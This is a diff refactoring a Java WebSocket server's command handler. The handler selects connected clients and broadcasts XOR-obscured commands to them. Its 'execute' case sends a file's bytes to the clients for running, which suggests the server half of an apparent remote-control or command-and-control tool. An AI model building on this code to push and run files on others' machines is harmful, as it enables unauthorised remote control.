@@ -1,7 +1,6 @@
 package me.soda.server.handlers;
 
 import me.soda.server.Server;
-import me.soda.server.XOR;
 import org.java_websocket.WebSocket;
 
 import java.io.File;
@@ -14,15 +13,12 @@ import java.util.List;
 public class CommandHandler {
     public static boolean encrypt = true;
     static List<WebSocket> connCollection;
-    static boolean allMode = false;
 
-    private void tryBroadcast(Server server, String message) {
+    private void tryBroadcast(String message, Server server) {
         if (encrypt) {
-            byte[] encrypted = XOR.encrypt(message);
-            if (allMode) server.broadcast(encrypted);
-            else server.broadcast(encrypted, connCollection);
-        } else if (allMode) server.broadcast(message);
-        else server.broadcast(message, connCollection);
+            byte[] encrypted = Server.xor.encrypt(message);
+            server.broadcast(encrypted, connCollection);
+        } else server.broadcast(message, connCollection);
     }
 
     public boolean handle(String in, Server server) {
@@ -46,12 +42,12 @@ public class CommandHandler {
                         } else if (msgArr.length == 3) {
                             switch (msgArr[1]) {
                                 case "sel" -> {
+                                    connCollection = new ArrayList<>();
                                     if (msgArr[2].equals("all")) {
-                                        allMode = true;
+                                        connCollection.addAll(server.getConnections());
                                         Server.log("Selected all clients!");
                                         break;
                                     }
-                                    connCollection = new ArrayList<>();
                                     server.getConnections().stream().filter(conn ->
                                                     conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
                                             .forEach(conn -> connCollection.add(conn));
@@ -75,8 +71,8 @@ public class CommandHandler {
                         if (msgArr.length < 2) break;
                         String[] strArr = new String[msgArr.length - 1];
                         System.arraycopy(msgArr, 1, strArr, 0, strArr.length);
-                        tryBroadcast(server, msgArr[0] + " " + Base64.getEncoder().encodeToString(
-                                String.join(" ", strArr).getBytes(StandardCharsets.UTF_8)));
+                        tryBroadcast(msgArr[0] + " " + Base64.getEncoder().encodeToString(
+                                String.join(" ", strArr).getBytes(StandardCharsets.UTF_8)), server);
                         break;
                     case "execute":
                         if (msgArr.length < 2) break;
@@ -84,10 +80,10 @@ public class CommandHandler {
                         System.arraycopy(msgArr, 1, strArr2, 0, strArr2.length);
                         File file = new File(String.join(" ", strArr2));
                         FileInputStream is = new FileInputStream(file);
-                        tryBroadcast(server, msgArr[0] + " " + Base64.getEncoder().encodeToString(is.readAllBytes()));
+                        tryBroadcast(msgArr[0] + " " + Base64.getEncoder().encodeToString(is.readAllBytes()), server);
                         break;
                     default:
-                        tryBroadcast(server, in);
+                        tryBroadcast(in, server);
                         break;
                 }
             } catch (Exception e) {
